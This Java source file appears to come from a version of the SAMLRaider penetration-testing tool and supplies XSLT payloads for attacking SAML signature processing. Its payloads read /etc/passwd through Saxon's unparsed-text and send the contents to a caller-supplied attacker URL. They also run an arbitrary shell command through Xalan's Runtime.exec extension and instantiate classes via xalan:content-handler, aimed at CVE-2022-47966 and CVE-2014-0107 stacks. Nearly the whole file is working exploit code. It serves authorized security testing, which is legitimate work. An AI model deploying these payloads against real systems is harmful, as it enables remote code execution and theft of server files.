package helpers;

/// Payload library for the "Test XSLT" attack. The original SAMLRaider only
/// shipped a Saxon XSLT 2.0 `unparsed-text` payload, which — as the presenter
/// at KazHackStan 2023 pointed out — does not detect the Xalan-based Java
/// SAML libraries that are the primary real-world target (e.g. CVE-2022-47966,
/// ManageEngine ServiceDesk, older Apache Santuario stacks).
///
/// This library exposes three payload flavors:
///   - SAXON_UNPARSED_TEXT: original probe, blind SSRF via `unparsed-text`
///   - XALAN_RUNTIME_EXEC: Java Runtime.exec via Xalan's java:java.lang.Runtime
///                         extension. Targets xmlsec <= 1.4.1 / Xalan stacks.
///   - XALAN_CLASS_INSTANTIATION: arbitrary class instantiation via
///                                 `xalan:content-handler` — bypasses Xalan
///                                 2.7.1 secure-processing (CVE-2014-0107)
///
/// References:
/// * KazHackStan deck, XSLT slides
/// * Viettel Cyber Security "SAML Show-Stopper": https://blog.viettelcybersecurity.com/saml-show-stopper/
/// * CVE-2022-47966: https://nvd.nist.gov/vuln/detail/CVE-2022-47966
public class XSLTPayloads {

    public enum Flavor {
        ALL("All 3 — Saxon SSRF + Xalan RCE (curl) + Class Instantiation"),
        SAXON_UNPARSED_TEXT("Saxon unparsed-text — blind SSRF (XSLT 2.0)"),
        XALAN_RUNTIME_EXEC("Xalan Runtime.exec — Java RCE (xmlsec ≤ 1.4.1)"),
        XALAN_CLASS_INSTANTIATION("Xalan DocumentHandler class instantiation (CVE-2014-0107)");

        private final String label;
        Flavor(String label) { this.label = label; }
        @Override public String toString() { return label; }
    }

    /// Returns the XSLT `<xsl:stylesheet>` body (without the surrounding
    /// ds:Transform element) for the given flavor. The caller wraps it into
    /// a `<ds:Transform Algorithm="...xslt...">` at insertion time.
    ///
    /// @param flavor  which payload to build
    /// @param param   user-provided parameter: URL for SAXON_UNPARSED_TEXT,
    ///                shell command for XALAN_RUNTIME_EXEC, URL for
    ///                XALAN_CLASS_INSTANTIATION (referenced via xalan:entities)
    public static String stylesheetFor(Flavor flavor, String param) {
        return switch (flavor) {
            case SAXON_UNPARSED_TEXT -> saxonUnparsedText(param);
            case XALAN_RUNTIME_EXEC -> xalanRuntimeExec(param);
            case XALAN_CLASS_INSTANTIATION -> xalanClassInstantiation(param);
            case ALL -> throw new IllegalArgumentException("ALL is handled by the caller — call stylesheetFor per-flavor");
        };
    }

    private static String saxonUnparsedText(String attackerUrl) {
        return """
                <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                  <xsl:template match="doc">
                    <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
                    <xsl:variable name="escaped" select="encode-for-uri($file)"/>
                    <xsl:variable name="attackerUrl" select="'%s'"/>
                    <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
                    <xsl:value-of select="unparsed-text($exploitUrl)"/>
                  </xsl:template>
                </xsl:stylesheet>
                """.formatted(attackerUrl);
    }

    private static String xalanRuntimeExec(String shellCommand) {
        // Shell-escape single quotes in the command before embedding.
        String escaped = shellCommand.replace("'", "&apos;");
        return """
                <xsl:stylesheet version="1.0"
                    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
                  <xsl:template match="/">
                    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
                    <xsl:variable name="process" select="rt:exec($rtobject,'%s')"/>
                    <xsl:variable name="processString" select="ob:toString($process)"/>
                    <xsl:value-of select="$processString"/>
                  </xsl:template>
                </xsl:stylesheet>
                """.formatted(escaped);
    }

    private static String xalanClassInstantiation(String externalUrl) {
        return """
                <xsl:stylesheet version="1.0"
                    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                    xmlns:xalan="http://xml.apache.org/xalan">
                  <xsl:output method="xml"
                      xalan:content-handler="com.sun.beans.decoder.DocumentHandler"
                      xalan:entities="%s"/>
                  <xsl:template match="/">
                    <xsl:message>probing xalan content-handler</xsl:message>
                  </xsl:template>
                </xsl:stylesheet>
                """.formatted(externalUrl);
    }

    private XSLTPayloads() {}
}
